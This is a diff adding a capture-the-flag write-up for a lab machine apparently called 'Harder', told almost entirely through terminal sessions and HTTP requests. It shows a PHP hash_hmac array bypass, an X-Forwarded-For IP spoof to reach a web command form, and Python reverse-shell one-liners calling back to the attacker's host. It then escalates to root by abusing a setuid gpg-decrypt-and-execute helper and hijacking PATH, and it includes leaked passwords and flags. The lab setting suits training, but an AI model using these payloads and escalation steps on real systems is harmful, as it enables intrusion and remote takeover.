@@ -433,3 +433,439 @@ Date:   Thu Oct 3 14:00:52 2019 +0300
 ┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
 └─$ git checkout .
 Updated 4 paths from the index
+
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
+└─$ ls -lah
+total 48K
+drwxr-xr-x 3 witty witty 4.0K Jul 17 19:37 .
+drwxr-xr-x 3 witty witty 4.0K Jul 17 19:35 ..
+-rw-r--r-- 1 witty witty  24K Jul 17 19:37 auth.php
+drwxr-xr-x 6 witty witty 4.0K Jul 17 19:37 .git
+-rw-r--r-- 1 witty witty   27 Jul 17 19:37 .gitignore
+-rw-r--r-- 1 witty witty  431 Jul 17 19:37 hmac.php
+-rw-r--r-- 1 witty witty  608 Jul 17 19:37 index.php
+                                                                              
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
+└─$ cat auth.php        
+<?php
+define('LOGIN_USER', "admin");
+define('LOGIN_PASS', "admin");
+
+function check(){
+
+	if(md5($this->prefix . LOGIN_PASS) != $this->pass || LOGIN_USER != $this->user){
+		//destroy any existing cookie by setting time in past
+		if(!empty($_COOKIE[$this->prefix.'user'])) setcookie($this->prefix."user", "blanked", time()-(3600*25));
+		if(!empty($_COOKIE[$this->prefix.'pass'])) setcookie($this->prefix."pass", "blanked", time()-(3600*25));
+		session_unset();
+		session_destroy();
+
+		$msg='<span class="red">'.INCORRECT_USERNAME_PASSWORD.'</span>';
+		$this->prompt($msg);
+	}
+}
+
+──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
+└─$ cat hmac.php      
+<?php
+if (empty($_GET['h']) || empty($_GET['host'])) {
+   header('HTTP/1.0 400 Bad Request');
+   print("missing get parameter");
+   die();
+}
+require("secret.php"); //set $secret var
+if (isset($_GET['n'])) {
+   $secret = hash_hmac('sha256', $_GET['n'], $secret);
+}
+
+$hm = hash_hmac('sha256', $_GET['host'], $secret);
+if ($hm !== $_GET['h']){
+  header('HTTP/1.0 403 Forbidden');
+  print("extra security check failed");
+  die();
+}
+?>
+
+https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/
+
+"_Complexity is the worst enemy of security_"
+
+┌──(witty㉿kali)-[~/bug_hunter/GitTools/Dumper/git]
+└─$ php -a
+Interactive shell
+
+php > $hmac = hash_hmac('sha256', Array(), "SecretKey");
+PHP Warning:  Uncaught TypeError: hash_hmac(): Argument #2 ($data) must be of type string, array given in php shell code:1
+Stack trace:
+#0 php shell code(1): hash_hmac()
+#1 {main}
+  thrown in php shell code on line 1
+php > echo $hmac == false;
+PHP Warning:  Undefined variable $hmac in php shell code on line 1
+1
+php > $hmac = hash_hmac('sha256', "securify.nl", false);
+php > echo $hmac;
+c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5
+
+nonce[]=&hostname=securify.nl&hmac=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5
+
+if (empty($_GET['h']) || empty($_GET['host'])) {
+
+so 
+
+or 
+
+n[]=&host=securify.nl&h=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5
+
+http://pwd.harder.local/index.php?n[]=&host=securify.nl&h=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5
+
+url 	username 	password (cleartext)
+http://shell.harder.local 	evs 	9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm
+
+login
+
+Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
+
+X-Forwarded-For:10.10.10.1
+
+POST /index.php HTTP/1.1
+
+Host: shell.harder.local
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 63
+
+Origin: http://shell.harder.local
+
+X-Forwarded-For:10.10.10.1
+
+Connection: close
+
+Referer: http://shell.harder.local/index.php
+
+Cookie: PHPSESSID=4se9himrrv161rk7jfvmm8cnjt
+
+Upgrade-Insecure-Requests: 1
+
+action=set_login&user=evs&pass=9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm
+
+       <form method="POST">
+            <div class="form-group">
+                <label for="cmd"><strong>Command</strong></label>
+				 <input type="text" class="form-control" name="cmd" id="cmd" value="" required>
+
+action=set_login&user=evs&pass=9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm&cmd=id
+
+uid=1001(www) gid=1001(www) groups=1001(www)
+
+revshell
+
+An error occurred.
+
+Sorry, the page you are looking for is currently unavailable.
+Please try again later.
+
+If you are the system administrator of this resource then you should check the error log for details.
+
+Faithfully yours, nginx.
+
+rebooting
+
+action=set_login&user=evs&pass=9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm&cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+
+using /bin/bash crash the machine
+
+python3 -c "import pty; pty.spawn('/bin/sh')"
+/home $ ls      
+ls
+evs  www
+```
+
+## Privilege Escalation
+```text
+# Press Ctrl+Z
+
+stty raw -echo; fg; reset;
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; alias l="ls -tuFlah --color=auto"; export SHELL=bash; export TERM=xterm-256color; stty rows 200 columns 200; reset;
+
+/home $ ls
+evs  www
+/home $ cd evs
+/home/evs $ ls
+user.txt
+/home/evs $ cat user.txt
+7e88bf11a579dc5ed66cc798cbe49f76
+
+/home/evs $ uname -a; cat /etc/issue
+Linux harder 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 Linux
+Welcome to Alpine Linux 3.12
+Kernel \r on an \m (\l)
+
+/home/evs $ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
+    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+/home/evs $ netstat -tunlp
+netstat: showing only processes with your user ID
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      31/python3
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      11/nginx: worker pr
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 :::8080                 :::*                    LISTEN      11/nginx: worker pr
+tcp        0      0 :::22                   :::*                    LISTEN      -
+/home/evs $ find / -perm -4000 2>/dev/null
+/usr/local/bin/execute-crypted
+
+/home/evs $ find / -name *.sh 2>/dev/null
+/usr/bin/findssl.sh
+/usr/local/bin/run-crypted.sh
+/etc/periodic/15min/evs-backup.sh
+
+/home/evs $ cat /etc/periodic/15min/evs-backup.sh
+#!/bin/ash
+```
+```text
+# ToDo: create a backup script, that saves the /www directory to our internal server
+```
+```text
+# for authentication use ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh evs@10.10.30.41               
+The authenticity of host '10.10.30.41 (10.10.30.41)' can't be established.
+ED25519 key fingerprint is SHA256:qe/uay80+hZjgfhQilcT9xOMMgrAk0nCK7Ng5g7bLMM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.30.41' (ED25519) to the list of known hosts.
+evs@10.10.30.41's password: 
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <http://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+harder:~$ id
+uid=1000(evs) gid=1000(evs) groups=1000(evs)
+
+harder:~$ cat /usr/local/bin/run-crypted.sh
+#!/bin/sh
+
+if [ $# -eq 0 ]
+  then
+    echo -n "[*] Current User: ";
+    whoami;
+    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
+    echo "[-] Create a file like this: echo -n whoami > command"
+    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
+  else
+    export GNUPGHOME=/root/.gnupg/
+    gpg --decrypt --no-verbose "$1" | ash
+fi
+
+harder:~$ find / -name root@harder.local* 2> /dev/null
+/var/backup/root@harder.local.pub
+
+harder:~$ cd /var
+harder:/var$ ls
+backup  empty   local   log     opt     spool   www
+cache   lib     lock    mail    run     tmp
+harder:/var$ cd backup
+harder:/var/backup$ ls
+root@harder.local.pub
+harder:/var/backup$ ls -lah
+total 16K    
+drwxr-x---    1 root     evs         4.0K Jul  7  2020 .
+drwxr-xr-x    1 root     root        4.0K Jul  7  2020 ..
+-rwxr-x---    1 root     evs          641 Jul  7  2020 root@harder.local.pub
+
+harder:/var/backup$ /usr/local/bin/execute-crypted
+[*] Current User: root
+[-] This program runs only commands which are encypted for root@harder.local using gpg.
+[-] Create a file like this: echo -n whoami > command
+[-] Encrypt the file and run the command: execute-crypted command.gpg
+
+harder:/var/backup$ cat root@harder.local.pub
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+mDMEXwTf8RYJKwYBBAHaRw8BAQdAkJtb3UCYvPmb1/JyRPADF0uYjU42h7REPlOK
+AbiN88i0IUFkbWluaXN0cmF0b3IgPHJvb3RAaGFyZGVyLmxvY2FsPoiQBBMWCAA4
+FiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwMFCwkIBwIGFQoJCAsCBBYC
+AwECHgECF4AACgkQyR1mFZRPaHSt8wD8CvJLt7qyCXuJZdOBPR+X7GI2dUg0DRRu
+c5gXzwk3rMMA/0JK6ZwZCHObWjwX0oLc3jvOCgQiIdaPq1WqN9/fhLAKuDgEXwTf
+8RIKKwYBBAGXVQEFAQEHQNa/To/VntzySOVdvOCW+iGscTLlnsjOmiGaaWvJG14O
+AwEIB4h4BBgWCAAgFiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwwACgkQ
+yR1mFZRPaHTMLQD/cqbV4dMvINa/KxATQDnbaln1Lg0jI9Jie39U44GKRIEBAJyi
++2AO+ERYahiVzkWwTEoUpjDJIv0cP/WVzfTvPk0D
+=qaa6
+-----END PGP PUBLIC KEY BLOCK-----
+
+ since we have a PGP public key owned by `root`, **we can try to get a reverse shell**!! or read the flag
+
+Import the PGP public key via `gpg --import`
+
+harder:/var/backup$ gpg --import root@harder.local.pub
+gpg: directory '/home/evs/.gnupg' created
+gpg: keybox '/home/evs/.gnupg/pubring.kbx' created
+gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created
+gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+
+harder:/var/backup$ nano read_flag
+-ash: nano: not found
+harder:/var/backup$ vim read_flag
+-ash: vim: not found
+
+http://osr5doc.xinuos.com/en/OSUserG/_Stopping_vi.html#:~:text=%3Awq,editing%20more%20than%20one%20file.
+
+ctrl +c cz i don't have esc
+
+:wq
+
+:q!
+
+harder:/home$ cd evs
+harder:~$ ls
+user.txt
+harder:~$ vi read_flag
+harder:~$ cat read_flag 
+cat /root/root.txt > /home/evs/root.txt
+
+now encrypt the file
+
+gpg --encrypt --output read_flag.gpg --recipient root@harder.local read_flag 
+
+or
+
+gpg -er root read_flag
+
+or
+
+gpg -e -r "Administrator" read_flag
+
+harder:~$ gpg -er root read_flag
+gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user
+
+sub  cv25519/6C1C04522C049868  Administrator <root@harder.local>
+ Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
+      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868
+
+It is NOT certain that the key belongs to the person named
+in the user ID.  If you *really* know what you are doing,
+you may answer the next question with yes.
+
+Use this key anyway? (y/N) y
+harder:~$ ls                
+read_flag      read_flag.gpg  user.txt
+
+harder:~$ /usr/local/bin/execute-crypted read_flag.gpg
+gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 
+      "Administrator <root@harder.local>"
+harder:~$ ls
+read_flag      read_flag.gpg  root.txt       user.txt
+harder:~$ cat root.txt 
+3a7bd72672889e0756b09f0566935a6c
+
+revshell
+
+harder:~$ vi revshell
+harder:~$ cat revshell
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.19.103",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
+
+harder:~$ gpg -er root revshell
+gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user
+
+sub  cv25519/6C1C04522C049868  Administrator <root@harder.local>
+ Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
+      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868
+
+It is NOT certain that the key belongs to the person named
+in the user ID.  If you *really* know what you are doing,
+you may answer the next question with yes.
+
+Use this key anyway? (y/N) y
+harder:~$ /usr/local/bin/execute-crypted revshell.gpg
+gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 
+      "Administrator <root@harder.local>"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nc -lnvp 4445                                           
+listening on [any] 4445 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.30.41] 44728
+harder:/home/evs# id      
+id
+uid=0(root) gid=1000(evs) groups=1000(evs)
+harder:/home/evs# cd /root 
+cd /root
+harder:~# ls       
+ls
+root.txt
+
+another way
+
+harder:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+harder:~$ cd /tmp
+harder:/tmp$ export PATH=/tmp:$PATH
+harder:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+echo -n "[*] Current User: ";
+    whoami;
+    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
+    echo "[-] Create a file like this: echo -n whoami > command"
+    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
+
+harder:/tmp$ vi whoami
+harder:/tmp$ cat whoami 
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.19.103",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
+
+harder:/tmp$ /usr/local/bin/execute-crypted
+[*] Current User: root
+[-] This program runs only commands which are encypted for root@harder.local using gpg.
+[-] Create a file like this: echo -n whoami > command
+[-] Encrypt the file and run the command: execute-crypted command.gpg
+harder:/tmp$ ls
+client_temp                      sess_4se9himrrv161rk7jfvmm8cnjt
+fastcgi_temp                     sess_utu0095om9rr89vk98njrm2t2t
+proxy_temp_path                  uwsgi_temp
+scgi_temp                        whoami
+harder:/tmp$ chmod 777 whoami
+harder:/tmp$ /usr/local/bin/execute-crypted
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nc -lnvp 4445
+listening on [any] 4445 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.30.41] 44774
+harder:/tmp# id       
+id
+uid=0(root) gid=1000(evs) groups=1000(evs)
+```
+Hack the machine and obtain the user Flag (user.txt)
+*7e88bf11a579dc5ed66cc798cbe49f76*
+Escalate your privileges and get the root Flag (root.txt)
+*3a7bd72672889e0756b09f0566935a6c*
+
+## Notes / Lessons Learned
+[[Cooctus Stories]]
+
